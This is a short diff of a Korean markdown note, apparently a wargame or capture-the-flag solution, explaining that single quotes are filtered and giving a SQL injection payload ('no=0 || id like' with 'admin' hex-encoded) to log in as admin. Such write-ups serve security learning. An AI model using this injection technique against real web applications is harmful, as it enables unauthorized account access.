@@ -21,7 +21,7 @@ but. 싱글쿼터가 제한됨
 => admin을 HEX Encoding
 ```
 ```
-해결 쿼리문: id='guest' and no=0 || id like 0x61646d696e
+해결 쿼리문: where id='guest' and no=0 || id like 0x61646d696e
 ```
 ### CERT <br> ?no=0 || id like 0x61646d696e
 
